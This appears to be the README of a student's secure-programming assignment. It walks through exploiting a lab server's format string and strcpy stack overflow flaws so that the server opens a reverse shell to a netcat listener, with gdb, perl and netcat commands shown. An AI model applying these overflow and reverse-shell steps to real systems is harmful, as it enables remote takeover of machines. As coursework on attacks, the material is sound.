#assignsecprog

Assignment for Secure Programming

##Contents
	
	Original Folder
		This repository contains all files for the assignement as we were given them
	
	All other files are created as part of the solution

##Installation

	To compile all files use the make command
	$ make

## Run it
	
	Open a shell
	$ ./server

	Open a new shell
	$ ./client

##Whats Going On
		
	I've created copies of the client and server called
	*server2
	*client2
	
	In server2.c
	There seem to be 2 possible vextors of attack 
	1. Line 41 - Format String Vulnerability
	2. Line 64 - Buffer Overflow Vulnerability

	In client.c
	The call to the vulnerable buffer overflow is at line 56

	Here's the plan
	1. Create a reverse shell function and edit the server code to call it directly
		This will verify that we can actually achjieve the attack 
	2. Add a new function dummy() that will just print a String to standard out and try to call it via a stack overflow and verify that the server prints the string 
		-This will verify that we can actually overflow the buffer and make it execute some code
	3. Create the payload from the remote shellcode we created from 1. 
	4. Alter the client2 app at line 56 to send the remote shell code as the payload.
	
## UPDATES

	The app now does 2 things.
	1. Uses the format string vulnerability to retrieve the saved frame pointer in read_name()
	2. Uses the strcpy stack overflow vulnerability to invoke a shell on the server (not a remote shell)
	
	Next Step: Write a Remote Shell will be invoked by the overflow vulnerability.

## Reverse Shell 

	I have the server2 now creating a remote shell to a listener (in this case NetCat) when the client hits it. 
	What happens is the client uses the buffer overflow to pass in the address of the reverseshell function and
	smashes the stack.
	
	-- Preparing the attack
	1. Get the hex equivelent of the Client IP in this case (127.0.0.1) so that the reverse client knows who to connect back to.
	perl -e 'printf "0x" . "%02x"x4 ."\n",1,0,0,127'
	0x0100007f
	
	2. Put this value into the variable "serv_addr.sin_addr.s_addr" in function reverseshell() in ./server2
	
	3. Get location of the reverseshell function in decimal form
	student@ca647:/media/KINGSTON/assignsecprog> gdb ./server2
	(gdb) p reverseshell
	$1 = {int ()} 0x8048a78 <reverseshell>
	(gdb) p/d 0x8048a78
	$2 = 134515320

	-- The Attack
	4. Copy that integer into the client2.c variable reverseshell_addr
	5. Run the make to build all the apps
	6. In a new shell run Netcat to listen for the remote shell connection
		$ netcat -l -v -p 43690
	7. In a new shell run  ./server2
	8. In a new shell run  ./client2
	9. In the netcat shell run a few shell comands

	
	

	Next step is to turn the reverseshell to asm and then to shell code...
